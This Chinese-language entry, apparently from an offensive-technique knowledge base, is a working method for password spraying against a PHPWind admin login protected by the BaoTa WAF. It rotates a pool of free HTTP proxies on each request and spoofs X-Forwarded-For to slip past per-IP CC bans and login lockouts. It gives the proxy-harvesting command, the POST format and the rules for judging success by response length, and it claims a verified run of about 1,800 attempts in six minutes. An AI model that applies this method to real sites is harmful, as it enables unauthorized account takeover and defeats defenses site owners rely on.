# 宝塔 WAF 按真实源IP CC 封禁下，用免费HTTP代理池逐请求轮换出口放大后台口令喷洒吞吐（含判据陷阱）

- **code**: 宝塔-waf-按真实源ip-cc-封禁下-用免费http代理池逐请求轮换出口放大后台口令喷洒吞吐-含判据陷阱
- **kind**: script
- **category**: weak-password
- **component**: 宝塔网站防火墙(BTWAF) 9.8.9 + PHPWind 后台 example.com
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-16 在 example.com 实测：无 XFF 时单出口直连后台 example.com 约 15-18 次即被应用层锁定(失败页14256B→登录页3951B)，且 #3689 记每~20-35 次后台POST即被宝塔 WAF 按真实源IP CC 封禁；改用免费HTTP代理池(proxyscrape/TheSpeedX/proxifly 等约3200候选，验活保留"GET example.com 200 且含 admin_name"的130个出口)，每请求随机换出口+随机XFF，两轮共 1842 组合在 ~6 分钟内完成、其中 1795 次拿到目标真实失败页，0 被 WAF 拦——吞吐相较单出口放大一个数量级以上。
- **tags**: 宝塔WAF,CC封禁,出口IP,免费代理池,口令喷洒,XForwardedFor,PHPWind,admin.php,判据陷阱
- **created_at**: 2026-10-15T17:50:32.488Z

## 描述

当目标(宝塔 WAF)按 socket 真实源IP 计 CC 且不采信 XFF 时(见 KB id396)，对后台登录 POST 面的口令喷洒会被掐死在几十次额度。解法：免费HTTP代理池取海量全新出口，逐请求(或每2-3个请求)随机换出口，使 WAF 的单IP计数无法累积；同时在每个出口内轮换 X-Forwarded-For 绕过应用层"15次/1200s"来源IP锁定(PHPWind $db_xforwardip=1 时)。关键陷阱：① 代理验证别用 GET 的 'admin_name' 判成败——后台失败页(~14.2KB)不含 admin_name，应按长度判：>10KB=失败、<2000=可疑成功、302=成功；② 免费池里有"echo 型假出口"(对任意请求返回 ~600B 的 REMOTE_ADDR/REQUEST_METHOD 回显页)，会被 <2000 的判据误判为成功，须按 body 含 'REMOTE_ADDR' 剔除；③ PHPWind 后台 example.com 的 verify 串可能是会话无关的静态值，喷洒每组合只需 1 个 POST。

## 用法

```
1) 抓源(本机有代理时走它, --ssl-no-revoke): curl -s --proxy http://127.0.0.1:7892 -A Mozilla/5.0 https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt ；2) 验活(并发250,timeout6): GET https://TARGET/bbs/example.com 必须 200 且 body 含 admin_name 且 len>3000；3) 喷洒: 24线程, 每请求随机挑一个未死出口 + 随机 XFF, POST example.com?&verify=<静态hash>& body=Login_f=1&admin_name=<gbk用户>&admin_pwd=<口令>&submit=；4) 判据: 403 或 body含'REMOTE_ADDR'(echo假出口)或异常→该出口标死换下一个；200且len>10000=失败、200且len<2000=可疑成功(须抓 body 复核)；总计约 1800 组合 6 分钟完成。
```
